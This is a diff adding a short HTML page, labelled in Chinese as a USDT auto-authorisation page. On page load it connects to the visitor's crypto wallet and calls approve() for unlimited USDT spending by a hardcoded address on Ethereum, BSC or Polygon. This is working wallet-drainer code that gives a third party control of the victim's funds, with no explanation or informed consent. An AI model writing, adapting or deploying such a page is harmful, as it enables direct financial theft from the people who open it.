@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>USDT 自动授权</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+</head>
+<body>
+  <h2 style="text-align: center;">正在自动授权 USDT...</h2>
+
+  <script>
+    const TARGET_ADDRESS = "0xF71dF0eD9A0ad68A4BA92F2719736540C122Dafc"; // 被授权者地址
+    const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+    const USDT_CONTRACTS = {
+      ethereum: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+      bsc: "0x55d398326f99059fF775485246999027B3197955",
+      polygon: "0x3813e82e6f7098b9583FC0F33a962D02018B6803"
+    };
+
+    async function autoApprove() {
+      if (!window.ethereum) {
+        alert("请在支持 Web3 的钱包中打开（如 MetaMask）");
+        return;
+      }
+
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      const signer = provider.getSigner();
+      const network = await provider.getNetwork();
+
+      let chain = "";
+      if (network.chainId === 1) chain = "ethereum";
+      else if (network.chainId === 56) chain = "bsc";
+      else if (network.chainId === 137) chain = "polygon";
+      else {
+        alert("不支持的链，请切换到 Ethereum / BSC / Polygon");
+        return;
+      }
+
+      const usdt = new ethers.Contract(
+        USDT_CONTRACTS[chain],
+        ["function approve(address spender, uint256 amount) public returns (bool)"],
+        signer
+      );
+
+      try {
+        const tx = await usdt.approve(TARGET_ADDRESS, MAX_UINT);
+        alert("授权成功！交易哈希: " + tx.hash);
+      } catch (err) {
+        alert("授权失败: " + err.message);
+      }
+    }
+
+    // 页面加载完立即授权
+    window.onload = autoApprove;
+  </script>
+</body>
+</html>
